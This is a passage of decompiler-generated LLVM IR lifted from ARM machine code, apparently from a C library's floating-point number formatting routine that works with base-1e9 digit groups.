  %v3_1517c = phi i8 [ %v3_1517c.pr, %dec_label_pc_1517cthread-pre-split ], [ %v5_15170, %dec_label_pc_15154 ]
  %v4_1517c = sext i8 %v3_1517c to i32
  store i32 %v4_1517c, i32* %r3.global-to-local, align 4
  %v1_15180 = icmp slt i8 %v3_1517c, 0
  br i1 %v1_15180, label %.thread452, label %bb587

.thread452:                                       ; preds = %dec_label_pc_1517c
  br label %bb588

bb587:                                            ; preds = %dec_label_pc_1517c
  store i32 %v5_15188, i32* %r0.global-to-local, align 4
  %v3_15190.pre = load i32, i32* @lr, align 4
  br label %bb588

bb588:                                            ; preds = %.thread452, %bb587
  %storemerge473 = phi i32 [ %v5_15188, %bb587 ], [ %v5_15184, %.thread452 ]
  %v3_1519c450453 = phi i32 [ %v5_15188, %bb587 ], [ %v3_15198295, %.thread452 ]
  %v3_15190454 = phi i32 [ %v3_15190.pre, %bb587 ], [ %v5_15184, %.thread452 ]
  %stack_var_-664.1.v3_151a0 = select i1 %v1_15180, i32 %v3_15190454, i32 %v3_1519c450453
  br label %dec_label_pc_151fc

dec_label_pc_151fc:                               ; preds = %bb588, %dec_label_pc_151fc
  %stack_var_-664.2 = phi i32 [ %v4_151b4, %dec_label_pc_151fc ], [ %stack_var_-664.1.v3_151a0, %bb588 ]
  %v0_151a8 = load i32, i32* @r6, align 4
  %v1_151ac = sext i32 %v0_151a8 to i64
  %v2_151ac = bitcast i64 %v1_151ac to double
  %v3_151ac = fptoui double %v2_151ac to i32
  store i32 %v3_151ac, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-664.2, i32* %r1.global-to-local, align 4
  %v2_151b4 = inttoptr i32 %stack_var_-664.2 to i32*
  store i32 %v3_151ac, i32* %v2_151b4, align 4
  %v3_151b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_151b4 = add i32 %v3_151b4, 4
  %v0_151c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_151c0, i32* %r2.global-to-local, align 4
  store i32 %v4_151b4, i32* %r3.global-to-local, align 4
  %v0_151c8 = load i32, i32* @r6, align 4
  store i32 %v0_151c8, i32* @r0, align 4
  %v0_151cc = load i32, i32* @r7, align 4
  store i32 %v0_151cc, i32* %r1.global-to-local, align 4
  %v5_151d0 = call i32 @__aeabi_dsub(i32 %v0_151c8, i32 %v0_151cc, i32 %v0_151c0, i32 %v4_151b4)
  %v6_151d0 = sext i32 %v5_151d0 to i64
  %v7_151d0 = bitcast i64 %v6_151d0 to double
  %v9_151dc = fmul double %v7_151d0, 0.000000e+00
  %v10_151dc = fptrunc double %v9_151dc to float
  %v11_151dc = bitcast float %v10_151dc to i32
  store i32 %v11_151dc, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v11_151dc, i32* @r6, align 4
  store i32 %v0_151cc, i32* @r7, align 4
  %v0_151f0 = call i32 @__aeabi_dcmpeq()
  store i32 %v0_151f0, i32* %r0.global-to-local, align 4
  %v2_151f4 = icmp eq i32 %v0_151f0, 0
  br i1 %v2_151f4, label %dec_label_pc_151fc, label %dec_label_pc_152bc

dec_label_pc_15200:                               ; preds = %dec_label_pc_152bc, %dec_label_pc_152ac.dec_label_pc_15200_crit_edge
  %v0_15210 = phi i32 [ %v0_15210.pre, %dec_label_pc_152ac.dec_label_pc_15200_crit_edge ], [ 0, %dec_label_pc_152bc ]
  %stack_var_-668.0 = phi i32 [ %stack_var_-668.1, %dec_label_pc_152ac.dec_label_pc_15200_crit_edge ], [ %storemerge473, %dec_label_pc_152bc ]
  %v3_15208 = phi i32 [ %v2_152b0, %dec_label_pc_152ac.dec_label_pc_15200_crit_edge ], [ %v4_152c0158, %dec_label_pc_152bc ]
  %stack_var_-664.4162 = phi i32 [ %v0_152a0.lcssa, %dec_label_pc_152ac.dec_label_pc_15200_crit_edge ], [ %v4_151b4, %dec_label_pc_152bc ]
  store i32 %stack_var_-664.4162, i32* %r6.global-to-local, align 4
  %v3_15204 = sub nsw i32 28, %v3_15208
  %v4_15204 = and i32 %v3_15204, %v3_15208
  %v5_15204 = icmp slt i32 %v4_15204, 0
  %v6_15204 = icmp slt i32 %v3_15208, 29
  %v2_15208 = xor i1 %v6_15204, %v5_15204
  %v3_15208. = select i1 %v2_15208, i32 %v3_15208, i32 29
  store i32 %v3_15208., i32* @r7, align 4
  br label %dec_label_pc_15258

dec_label_pc_15218:                               ; preds = %dec_label_pc_15258
  %v1_15218 = inttoptr i32 %v1_1525c to i32*
  %v2_15218 = load i32, i32* %v1_15218, align 4
  %v2_15220 = shl i32 %v2_15218, %v0_15264
  %v2_15224 = add i32 %v2_15220, %v0_15224
  store i32 %v2_15224, i32* @r4, align 4
  %v3_15224 = icmp ult i32 %v2_15224, %v0_15224
  %v4_15228 = zext i1 %v3_15224 to i32
  store i32 %v4_15228, i32* @r5, align 4
  store i32 %v2_15224, i32* @r0, align 4
  store i32 %v4_15228, i32* @r1, align 4
  store i32 1000000000, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_1523c = call i32 @__aeabi_uldivmod(i32 %v2_15224, i32 %v4_15228, i32 1000000000, i32 0)
  %v0_15240 = load i32, i32* @r4, align 4
  store i32 %v0_15240, i32* @r0, align 4
  %v1_15244 = load i32, i32* @r6, align 4
  %v2_15244 = inttoptr i32 %v1_15244 to i32*
  store i32 1000000000, i32* %v2_15244, align 4
  %v0_15248 = load i32, i32* @r5, align 4
  store i32 %v0_15248, i32* @r1, align 4
  store i32 1000000000, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_15254 = call i32 @__aeabi_uldivmod(i32 %v0_15240, i32 %v0_15248, i32 1000000000, i32 0)
  %v0_1525c.pre = load i32, i32* @r6, align 4
  %v0_15264.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15258

dec_label_pc_15258:                               ; preds = %dec_label_pc_15200, %dec_label_pc_15218
  %v0_15264 = phi i32 [ %v0_15264.pre, %dec_label_pc_15218 ], [ %v3_15208., %dec_label_pc_15200 ]
  %v0_1525c = phi i32 [ %v0_1525c.pre, %dec_label_pc_15218 ], [ %stack_var_-664.4162, %dec_label_pc_15200 ]
  %v0_15224 = phi i32 [ %v4_15254, %dec_label_pc_15218 ], [ %v0_15210, %dec_label_pc_15200 ]
  store i32 %v0_15224, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-668.0, i32* %r3.global-to-local, align 4
  %v1_1525c = add i32 %v0_1525c, -4
  store i32 %v1_1525c, i32* @r6, align 4
  %v3_15260 = icmp ult i32 %v1_1525c, %stack_var_-668.0
  store i32 %v0_15264, i32* %r2.global-to-local, align 4
  store i32 %v0_15224, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br i1 %v3_15260, label %dec_label_pc_15274, label %dec_label_pc_15218

dec_label_pc_15274:                               ; preds = %dec_label_pc_15258
  %v2_15274 = icmp eq i32 %v0_15224, 0
  br i1 %v2_15274, label %dec_label_pc_15290.preheader, label %bb591

bb591:                                            ; preds = %dec_label_pc_15274
  %v3_15278 = add i32 %stack_var_-668.0, -4
  %v4_15278 = inttoptr i32 %v3_15278 to i32*
  store i32 %v0_15224, i32* %v4_15278, align 4
  %v5_15278 = load i32, i32* %r3.global-to-local, align 4
  %v6_15278 = add i32 %v5_15278, -4
  store i32 %v6_15278, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15290.preheader

dec_label_pc_15290.preheader:                     ; preds = %bb591, %dec_label_pc_15274
  %stack_var_-668.1 = phi i32 [ %stack_var_-668.0, %dec_label_pc_15274 ], [ %v6_15278, %bb591 ]
  store i32 %stack_var_-668.1, i32* %r0.global-to-local, align 4
  %tmp592716 = icmp ugt i32 %stack_var_-664.4162, %stack_var_-668.1
  br i1 %tmp592716, label %dec_label_pc_152a0, label %dec_label_pc_152ac

dec_label_pc_15284:                               ; preds = %dec_label_pc_152a0
  store i32 %v1_152a0, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-668.1, i32* %r0.global-to-local, align 4
  %tmp592 = icmp ugt i32 %v1_152a0, %stack_var_-668.1
  br i1 %tmp592, label %dec_label_pc_152a0, label %dec_label_pc_152ac

dec_label_pc_152a0:                               ; preds = %dec_label_pc_15290.preheader, %dec_label_pc_15284
  %v0_152a0717 = phi i32 [ %v1_152a0, %dec_label_pc_15284 ], [ %stack_var_-664.4162, %dec_label_pc_15290.preheader ]
  %v1_152a0 = add i32 %v0_152a0717, -4
  %v2_152a0 = inttoptr i32 %v1_152a0 to i32*
  %v3_152a0 = load i32, i32* %v2_152a0, align 4
  store i32 %v3_152a0, i32* %r3.global-to-local, align 4
  %v2_152a4 = icmp eq i32 %v3_152a0, 0
  br i1 %v2_152a4, label %dec_label_pc_15284, label %dec_label_pc_152ac

dec_label_pc_152ac:                               ; preds = %dec_label_pc_152a0, %dec_label_pc_15284, %dec_label_pc_15290.preheader
  %v0_152a0.lcssa = phi i32 [ %stack_var_-664.4162, %dec_label_pc_15290.preheader ], [ %v1_152a0, %dec_label_pc_15284 ], [ %v0_152a0717, %dec_label_pc_152a0 ]
  %v3_152ac = load i8, i8* %stack_var_-52, align 1
  %v4_152ac = sext i8 %v3_152ac to i32
  %v0_152b0 = load i32, i32* @r7, align 4
  %v2_152b0 = sub i32 %v4_152ac, %v0_152b0
  store i32 %v2_152b0, i32* %r3.global-to-local, align 4
  %v5_152b4 = trunc i32 %v2_152b0 to i8
  store i8 %v5_152b4, i8* %stack_var_-52, align 1
  store i32 %v2_152b0, i32* %r2.global-to-local, align 4
  %v5_152c8 = icmp sgt i8 %v5_152b4, 0
  br i1 %v5_152c8, label %dec_label_pc_152ac.dec_label_pc_15200_crit_edge, label %dec_label_pc_152cc

dec_label_pc_152ac.dec_label_pc_15200_crit_edge:  ; preds = %dec_label_pc_152ac
  %v0_15210.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_15200

dec_label_pc_152bc:                               ; preds = %dec_label_pc_151fc
  store i32 0, i32* @r8, align 4
  %v3_152c0.pr = load i8, i8* %stack_var_-52, align 1
  %v4_152c0158 = sext i8 %v3_152c0.pr to i32
  store i32 %v4_152c0158, i32* %r2.global-to-local, align 4
  %v5_152c8161 = icmp sgt i8 %v3_152c0.pr, 0
  br i1 %v5_152c8161, label %dec_label_pc_15200, label %dec_label_pc_152cc

dec_label_pc_152cc:                               ; preds = %dec_label_pc_152ac, %dec_label_pc_152bc
  %stack_var_-668.2 = phi i32 [ %storemerge473, %dec_label_pc_152bc ], [ %stack_var_-668.1, %dec_label_pc_152ac ]
  %stack_var_-52.promoted = phi i8 [ %v3_152c0.pr, %dec_label_pc_152bc ], [ %v5_152b4, %dec_label_pc_152ac ]
  %stack_var_-664.4.lcssa = phi i32 [ %v4_151b4, %dec_label_pc_152bc ], [ %v0_152a0.lcssa, %dec_label_pc_152ac ]
  %v1_152d0 = add i32 %v1_1543c, 25
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_152d8 = sdiv i32 %v1_152d0, 9
  store i32 1000000000, i32* @sl, align 4
  %v1_152e0 = add nsw i32 %v2_152d8, 1
  store i32 %v1_152e0, i32* %r0.global-to-local, align 4
  %v3_152e4 = mul i32 %v1_152e0, 4
  store i32 %v3_152e4, i32* %r6.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r7, align 4
  %v4_15390173 = sext i8 %stack_var_-52.promoted to i32
  store i32 %v4_15390173, i32* %r3.global-to-local, align 4
  %v1_15394174 = icmp slt i8 %stack_var_-52.promoted, 0
  br i1 %v1_15394174, label %dec_label_pc_152f4.preheader, label %dec_label_pc_1539c

dec_label_pc_152f4.preheader:                     ; preds = %dec_label_pc_152cc
  %v7_15368 = icmp eq i32 %v1_14e20, 102
  br label %dec_label_pc_152f4

dec_label_pc_152f4:                               ; preds = %dec_label_pc_15390.dec_label_pc_152f4_crit_edge, %dec_label_pc_152f4.preheader
  %v0_15310 = phi i32 [ %v0_15310.pre, %dec_label_pc_15390.dec_label_pc_152f4_crit_edge ], [ 0, %dec_label_pc_152f4.preheader ]
  %v0_15304 = phi i32 [ %v0_15304.pre, %dec_label_pc_15390.dec_label_pc_152f4_crit_edge ], [ 1000000000, %dec_label_pc_152f4.preheader ]
  %v0_15300 = phi i32 [ %v0_15300.pre, %dec_label_pc_15390.dec_label_pc_152f4_crit_edge ], [ 1, %dec_label_pc_152f4.preheader ]
  %stack_var_-668.3 = phi i32 [ %stack_var_-668.4, %dec_label_pc_15390.dec_label_pc_152f4_crit_edge ], [ %stack_var_-668.2, %dec_label_pc_152f4.preheader ]
  %v0_152f4 = phi i32 [ %v2_15384, %dec_label_pc_15390.dec_label_pc_152f4_crit_edge ], [ %v4_15390173, %dec_label_pc_152f4.preheader ]
  %v3_1537c205 = phi i8 [ %v5_1538c, %dec_label_pc_15390.dec_label_pc_152f4_crit_edge ], [ %stack_var_-52.promoted, %dec_label_pc_152f4.preheader ]
  %v2_15354 = phi i32 [ %v3_15388.stack_var_-664.7.v1_1535c, %dec_label_pc_15390.dec_label_pc_152f4_crit_edge ], [ %stack_var_-664.4.lcssa, %dec_label_pc_152f4.preheader ]
  %v1_152f4 = sub nsw i32 0, %v0_152f4
  %v3_152f8 = add nsw i32 %v0_152f4, 8
  %v4_152f8 = and i32 %v3_152f8, %v1_152f4
  %v5_152f8 = icmp slt i32 %v4_152f8, 0
  %v6_152f8 = icmp sgt i32 %v0_152f4, -9
  %v2_152fc = xor i1 %v6_152f8, %v5_152f8
  %v1_152f4. = select i1 %v2_152fc, i32 %v1_152f4, i32 9
  store i32 %v1_152f4., i32* %lr.global-to-local, align 4
  %v6_15300 = shl i32 %v0_15300, %v1_152f4.
  store i32 %v6_15300, i32* %r3.global-to-local, align 4
  %v6_15304 = ashr i32 %v0_15304, %v1_152f4.
  store i32 %v6_15304, i32* %r5.global-to-local, align 4
  store i32 %stack_var_-668.3, i32* %r1.global-to-local, align 4
  %v1_1530c = add i32 %v6_15300, -1
  store i32 %v1_1530c, i32* %r4.global-to-local, align 4
  store i32 %v0_15310, i32* %ip.global-to-local, align 4
  store i32 %v2_15354, i32* %r2.global-to-local, align 4
  %v3_15330165 = icmp ult i32 %stack_var_-668.3, %v2_15354
  %v1_15318720 = inttoptr i32 %stack_var_-668.3 to i32*
  br i1 %v3_15330165, label %dec_label_pc_15318.preheader, label %dec_label_pc_15338

dec_label_pc_15318.preheader:                     ; preds = %dec_label_pc_152f4
  %v2_15318721 = load i32, i32* %v1_15318720, align 4
  %v7_1531c722 = lshr i32 %v2_15318721, %v1_152f4.
  %v8_1531c723 = add i32 %v7_1531c722, %v0_15310
  %v2_15320724 = and i32 %v2_15318721, %v1_1530c
  store i32 %v2_15320724, i32* %r3.global-to-local, align 4
  %v2_15324725 = mul i32 %v2_15320724, %v6_15304
  store i32 %v2_15324725, i32* %ip.global-to-local, align 4
  store i32 %v8_1531c723, i32* %v1_15318720, align 4
  %v3_15328726 = load i32, i32* %r1.global-to-local, align 4
  %v4_15328727 = add i32 %v3_15328726, 4
  store i32 %v4_15328727, i32* %r1.global-to-local, align 4
  store i32 %v2_15354, i32* %r2.global-to-local, align 4
  %v3_15330728 = icmp ult i32 %v4_15328727, %v2_15354
  br i1 %v3_15330728, label %dec_label_pc_15318.dec_label_pc_15318_crit_edge, label %dec_label_pc_15338

dec_label_pc_15318.dec_label_pc_15318_crit_edge:  ; preds = %dec_label_pc_15318.preheader, %dec_label_pc_15318.dec_label_pc_15318_crit_edge
  %v4_15328729 = phi i32 [ %v4_15328, %dec_label_pc_15318.dec_label_pc_15318_crit_edge ], [ %v4_15328727, %dec_label_pc_15318.preheader ]
  %v0_1531c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1531c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15320.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_15324.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_15318 = inttoptr i32 %v4_15328729 to i32*
  %v2_15318 = load i32, i32* %v1_15318, align 4
  %v7_1531c = lshr i32 %v2_15318, %v2_1531c.pre
  %v8_1531c = add i32 %v7_1531c, %v0_1531c.pre
  %v2_15320 = and i32 %v2_15318, %v0_15320.pre
  store i32 %v2_15320, i32* %r3.global-to-local, align 4
  %v2_15324 = mul i32 %v2_15320, %v0_15324.pre
  store i32 %v2_15324, i32* %ip.global-to-local, align 4
  store i32 %v8_1531c, i32* %v1_15318, align 4
  %v3_15328 = load i32, i32* %r1.global-to-local, align 4
  %v4_15328 = add i32 %v3_15328, 4
  store i32 %v4_15328, i32* %r1.global-to-local, align 4
  store i32 %v2_15354, i32* %r2.global-to-local, align 4
  %v3_15330 = icmp ult i32 %v4_15328, %v2_15354
  br i1 %v3_15330, label %dec_label_pc_15318.dec_label_pc_15318_crit_edge, label %dec_label_pc_15338

dec_label_pc_15338:                               ; preds = %dec_label_pc_152f4, %dec_label_pc_15318.preheader, %dec_label_pc_15318.dec_label_pc_15318_crit_edge
  store i32 %stack_var_-668.3, i32* %r1.global-to-local, align 4
  %v2_1533c = load i32, i32* %v1_15318720, align 4
  store i32 %v2_1533c, i32* %r3.global-to-local, align 4
  %v2_15340 = icmp eq i32 %v2_1533c, 0
  br i1 %v2_15340, label %bb593, label %.thread91

bb593:                                            ; preds = %dec_label_pc_15338
  %v2_15344 = add i32 %stack_var_-668.3, 4
  store i32 %v2_15344, i32* %r1.global-to-local, align 4
  br label %.thread91

.thread91:                                        ; preds = %dec_label_pc_15338, %bb593
  %stack_var_-668.4 = phi i32 [ %v2_15344, %bb593 ], [ %stack_var_-668.3, %dec_label_pc_15338 ]
  %v0_1534c = load i32, i32* %ip.global-to-local, align 4
  %v2_1534c = icmp eq i32 %v0_1534c, 0
  br i1 %v2_1534c, label %.thread92, label %bb594

bb594:                                            ; preds = %.thread91
  store i32 %v2_15354, i32* %r2.global-to-local, align 4
  %v3_15354 = inttoptr i32 %v2_15354 to i32*
  store i32 %v0_1534c, i32* %v3_15354, align 4
  %v4_15354 = load i32, i32* %r2.global-to-local, align 4
  %v5_15354 = add i32 %v4_15354, 4
  store i32 %v5_15354, i32* %r2.global-to-local, align 4
  br label %.thread92

.thread92:                                        ; preds = %.thread91, %bb594
  %v1_1535c = phi i32 [ %v2_15354, %.thread91 ], [ %v5_15354, %bb594 ]
  store i32 %v1_14e20, i32* %ip.global-to-local, align 4
  %stack_var_-664.7.v1_1535c = select i1 %v2_1534c, i32 %v2_15354, i32 %v1_1535c
  store i32 %stack_var_-664.1.v3_151a0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-668.4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-664.7.v1_1535c, i32* %r1.global-to-local, align 4
  br i1 %v7_15368, label %bb595, label %bb596

bb595:                                            ; preds = %.thread92
  store i32 %stack_var_-664.1.v3_151a0, i32* %r2.global-to-local, align 4
  br label %bb596

bb596:                                            ; preds = %.thread92, %bb595
  %v3_15380 = phi i32 [ %stack_var_-668.4, %.thread92 ], [ %stack_var_-664.1.v3_151a0, %bb595 ]
  %v2_15374 = sub i32 %stack_var_-664.7.v1_1535c, %v3_15380
  %v0_15378 = load i32, i32* %r0.global-to-local, align 4
  %v4_15378 = sdiv i32 %v2_15374, 4
  %v5_15378 = sub i32 %v0_15378, %v4_15378
  %v7_15378 = xor i32 %v4_15378, %v0_15378
  %v8_15378 = xor i32 %v5_15378, %v0_15378
  %v9_15378 = and i32 %v8_15378, %v7_15378
  %v10_15378 = icmp slt i32 %v9_15378, 0
  %v11_15378 = icmp slt i32 %v5_15378, 0
  %v4_1537c = sext i8 %v3_1537c205 to i32
  store i32 %v4_1537c, i32* %r3.global-to-local, align 4
  %v2_15380 = xor i1 %v11_15378, %v10_15378
  br i1 %v2_15380, label %bb597, label %dec_label_pc_15390

bb597:                                            ; preds = %bb596
  %v4_15380 = load i32, i32* %r6.global-to-local, align 4
  %v5_15380 = add i32 %v4_15380, %v3_15380
  store i32 %v5_15380, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15390

dec_label_pc_15390:                               ; preds = %bb596, %bb597
  %v3_15388 = phi i32 [ %v3_15380, %bb596 ], [ %v5_15380, %bb597 ]
  %v1_15384 = load i32, i32* %lr.global-to-local, align 4
  %v2_15384 = add i32 %v1_15384, %v4_1537c
  %v3_15388.stack_var_-664.7.v1_1535c = select i1 %v2_15380, i32 %v3_15388, i32 %stack_var_-664.7.v1_1535c
  %v5_1538c = trunc i32 %v2_15384 to i8
  store i32 %v2_15384, i32* %r3.global-to-local, align 4
  %v1_15394 = icmp slt i8 %v5_1538c, 0
  br i1 %v1_15394, label %dec_label_pc_15390.dec_label_pc_152f4_crit_edge, label %dec_label_pc_15390.dec_label_pc_1539c_crit_edge

dec_label_pc_15390.dec_label_pc_152f4_crit_edge:  ; preds = %dec_label_pc_15390
  %v0_15300.pre = load i32, i32* @r7, align 4
  %v0_15304.pre = load i32, i32* @sl, align 4
  %v0_15310.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_152f4

dec_label_pc_15390.dec_label_pc_1539c_crit_edge:  ; preds = %dec_label_pc_15390
  store i8 %v5_1538c, i8* %stack_var_-52, align 1
  br label %dec_label_pc_1539c

dec_label_pc_1539c:                               ; preds = %dec_label_pc_152cc, %dec_label_pc_15390.dec_label_pc_1539c_crit_edge
  %stack_var_-668.5 = phi i32 [ %stack_var_-668.4, %dec_label_pc_15390.dec_label_pc_1539c_crit_edge ], [ %stack_var_-668.2, %dec_label_pc_152cc ]
  %stack_var_-664.7.lcssa = phi i32 [ %v3_15388.stack_var_-664.7.v1_1535c, %dec_label_pc_15390.dec_label_pc_1539c_crit_edge ], [ %stack_var_-664.4.lcssa, %dec_label_pc_152cc ]
  store i32 %stack_var_-668.5, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-664.7.lcssa, i32* %r3.global-to-local, align 4
  %v3_153a4 = icmp ult i32 %stack_var_-668.5, %stack_var_-664.7.lcssa
  br i1 %v3_153a4, label %dec_label_pc_153b4, label %bb598

bb598:                                            ; preds = %dec_label_pc_1539c
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_153f8

dec_label_pc_153b4:                               ; preds = %dec_label_pc_1539c
  store i32 %stack_var_-668.5, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-664.1.v3_151a0, i32* %lr.global-to-local, align 4
  %v2_153bc = sub i32 %stack_var_-664.1.v3_151a0, %stack_var_-668.5
  %v3_153c0 = sdiv i32 %v2_153bc, 4
  %v2_153c8 = mul i32 %v3_153c0, 9
  store i32 %v2_153c8, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_153d4 = inttoptr i32 %stack_var_-668.5 to i32*
  %v2_153d4 = load i32, i32* %v1_153d4, align 4
  store i32 %v2_153d4, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_153f0182 = icmp ugt i32 %v2_153d4, 9
  br i1 %v3_153f0182, label %dec_label_pc_153e0, label %dec_label_pc_153f8

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153b4, %dec_label_pc_153e0
  %v2_153e0206 = phi i32 [ %v2_153e0, %dec_label_pc_153e0 ], [ 10, %dec_label_pc_153b4 ]
  %stack_var_-680.2.in190 = phi i32 [ %v1_153e8, %dec_label_pc_153e0 ], [ %v2_153c8, %dec_label_pc_153b4 ]
  %v2_153e0 = mul i32 %v2_153e0206, 10
  %v1_153e8 = add i32 %stack_var_-680.2.in190, 1
  %v3_153f0 = icmp ult i32 %v2_153d4, %v2_153e0
  br i1 %v3_153f0, label %dec_label_pc_153f0.dec_label_pc_153f8.loopexit_crit_edge, label %dec_label_pc_153e0

dec_label_pc_153f0.dec_label_pc_153f8.loopexit_crit_edge: ; preds = %dec_label_pc_153e0
  store i32 %v2_153e0, i32* %r3.global-to-local, align 4
  store i32 %v1_153e8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_153f8

dec_label_pc_153f8:                               ; preds = %dec_label_pc_153b4, %dec_label_pc_153f0.dec_label_pc_153f8.loopexit_crit_edge, %bb598
  %v0_15414 = phi i32 [ 0, %bb598 ], [ %v1_153e8, %dec_label_pc_153f0.dec_label_pc_153f8.loopexit_crit_edge ], [ %v2_153c8, %dec_label_pc_153b4 ]
  %stack_var_-680.3 = inttoptr i32 %v0_15414 to i8*
  store i32 %v1_14e20, i32* %lr.global-to-local, align 4
  store i32 %stack_var_-664.7.lcssa, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-664.1.v3_151a0, i32* %r1.global-to-local, align 4
  store i32 %v0_15414, i32* %ip.global-to-local, align 4
  %v2_15408 = sub i32 %stack_var_-664.7.lcssa, %stack_var_-664.1.v3_151a0
  store i32 %v2_15408, i32* %r3.global-to-local, align 4
  %v1_1540c = add nsw i32 %v1_14e20, -102
  %v7_1540c = icmp eq i32 %v1_14e20, 102
  br i1 %v7_1540c, label %bb601, label %bb600

bb600:                                            ; preds = %dec_label_pc_153f8
  br label %bb601

bb601:                                            ; preds = %dec_label_pc_153f8, %bb600
  %v1_15414 = phi i32 [ 1, %bb600 ], [ %v1_1540c, %dec_label_pc_153f8 ]
  %v2_15414 = mul i32 %v1_15414, %v0_15414
  store i32 %v2_15414, i32* %r2.global-to-local, align 4
  %v3_15418 = sdiv i32 %v2_15408, 4
  store i32 9, i32* @r5, align 4
  %v2_15420 = mul i32 %v3_15418, 9
  store i32 %v2_15420, i32* %r3.global-to-local, align 4
  store i32 %v1_1543c, i32* %r0.global-to-local, align 4
  %v7_15428 = icmp eq i32 %v1_14e20, 103
  %.648 = zext i1 %v7_15428 to i32
  %v2_15434 = icmp eq i32 %v1_1543c, 0
  br i1 %v2_15434, label %bb604, label %bb605

bb604:                                            ; preds = %bb601
  br label %bb605

bb605:                                            ; preds = %bb601, %bb604
  %storemerge885 = phi i32 [ 0, %bb604 ], [ %.648, %bb601 ]
  %v0_15440 = phi i32 [ 0, %bb604 ], [ %.648, %bb601 ]
  store i32 %storemerge885, i32* %r1.global-to-local, align 4
  %v2_1543c = sub i32 %v1_1543c, %v2_15414
  %v2_15440 = sub i32 %v2_1543c, %v0_15440
  store i32 %v2_15440, i32* %r2.global-to-local, align 4
  %v1_15444 = add i32 %v2_15420, -9
  store i32 %v1_15444, i32* %r3.global-to-local, align 4
  %v2_15448 = sub i32 %v2_15440, %v1_15444
  %v4_15448 = xor i32 %v2_15440, %v1_15444
  %v5_15448 = xor i32 %v2_15448, %v2_15440
  %v6_15448 = and i32 %v5_15448, %v4_15448
  %v7_15448 = icmp slt i32 %v6_15448, 0
  %v8_15448 = icmp slt i32 %v2_15448, 0
  %v2_1544c = xor i1 %v8_15448, %v7_15448
  br i1 %v2_1544c, label %dec_label_pc_15450, label %dec_label_pc_15678.preheader

dec_label_pc_15450:                               ; preds = %bb605
  %v1_15450 = add i32 %v2_15440, 9216
  store i32 %v1_15450, i32* %r4.global-to-local, align 4
  %v2_1545c = sdiv i32 %v1_15450, 9
  %v1_15468 = add i32 %stack_var_-664.1.v3_151a0, -4092
  %v4_1546c = mul nsw i32 %v2_1545c, 4
  %v5_1546c = add i32 %v1_15468, %v4_1546c
  store i32 %v5_1546c, i32* @sb, align 4
  %v2_15478 = udiv i32 %v1_15450, 9
  %v3_15478 = urem i32 %v1_15450, 9
  store i32 %v2_15478, i32* %r0.global-to-local, align 4
  store i32 10, i32* @sl, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_154f0193 = add nuw nsw i32 %v3_15478, 1
  store i32 %v1_154f0193, i32* %r1.global-to-local, align 4
  %v7_154f8201 = icmp ult i32 %v1_154f0193, 9
  br i1 %v7_154f8201, label %dec_label_pc_154f0, label %dec_label_pc_154fc

dec_label_pc_154f0:                               ; preds = %dec_label_pc_15450, %dec_label_pc_154f0
  %v1_154f0208 = phi i32 [ %v1_154f0, %dec_label_pc_154f0 ], [ %v1_154f0193, %dec_label_pc_15450 ]
  %v2_154ec207 = phi i32 [ %v2_154ec, %dec_label_pc_154f0 ], [ 10, %dec_label_pc_15450 ]
  %v2_154ec = mul i32 %v2_154ec207, 10
  %v1_154f0 = add i32 %v1_154f0208, 1
  %v7_154f8 = icmp slt i32 %v1_154f0, 9
  br i1 %v7_154f8, label %dec_label_pc_154f0, label %dec_label_pc_154f0.dec_label_pc_154fc_crit_edge

dec_label_pc_154f0.dec_label_pc_154fc_crit_edge:  ; preds = %dec_label_pc_154f0
  store i32 %v2_154ec, i32* @sl, align 4
  store i32 %v1_154f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154fc

dec_label_pc_154fc:                               ; preds = %dec_label_pc_154f0.dec_label_pc_154fc_crit_edge, %dec_label_pc_15450
  %v1_15544 = phi i32 [ %v2_154ec, %dec_label_pc_154f0.dec_label_pc_154fc_crit_edge ], [ 10, %dec_label_pc_15450 ]
  %v1_154fc = inttoptr i32 %v5_1546c to i32*
  %v2_154fc = load i32, i32* %v1_154fc, align 4
  store i32 %v2_154fc, i32* %fp.global-to-local, align 4
  %v2_15508 = udiv i32 %v2_154fc, %v1_15544
  %v3_15508 = urem i32 %v2_154fc, %v1_15544
  store i32 %v2_15508, i32* %r0.global-to-local, align 4
  store i32 %v3_15508, i32* %r1.global-to-local, align 4
  %v2_1550c = icmp eq i32 %v3_15508, 0
  br i1 %v2_1550c, label %dec_label_pc_15518, label %dec_label_pc_15528

dec_label_pc_15518:                               ; preds = %dec_label_pc_154fc
  store i32 %stack_var_-664.7.lcssa, i32* %r2.global-to-local, align 4
  %v1_1551c = add i32 %v5_1546c, 4
  store i32 %v1_1551c, i32* %r3.global-to-local, align 4
  %v9_15520 = icmp eq i32 %v1_1551c, %stack_var_-664.7.lcssa
